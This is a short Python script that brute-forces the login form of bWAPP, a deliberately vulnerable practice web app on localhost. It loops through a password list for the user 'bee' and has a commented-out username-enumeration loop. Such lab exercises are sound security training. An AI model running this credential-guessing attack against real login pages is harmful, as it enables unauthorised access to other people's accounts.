import requests
import re

url = "http://localhost/bWAPP/login.php"


# name - value
def login(username, password):
    r = requests.post(url, data={
        "login": username,
        "password": password,
        "form": "submit",
        "security_level": "0"
    })

    return r


with open("usernames.txt", "r") as h:
    usernames = [line.strip() for line in h.read().split("\n") if line]


with open("passwords.txt", "r") as h:
    passwords = [line.strip() for line in h.read().split("\n") if line]


# for username in usernames:
#     response = login(username, "bug").url
#
#     pattern = re.compile(r"login")
#     result = pattern.findall(response)
#
#     if not result:
#         print(f"username {username}: Username is Found!")
#     else:
#         print(f"username {username}: Wrong!!!!!!")


for password in passwords:
    response = login("bee", password).url

    pattern = re.compile(r"portal")
    result = pattern.findall(response)

    if not result:
        print(f"password {password}: Wrong!!")
    else:
        print(f"password {password}: Password is Found!")

    # if result[0] == "login":
    #     print(f"username {username}: Wrong!!!!!!")
    # else:
    #     print(f"username {username}: Username is Found!")

# current_url = login("bee", "bdug").url
# print(current_url)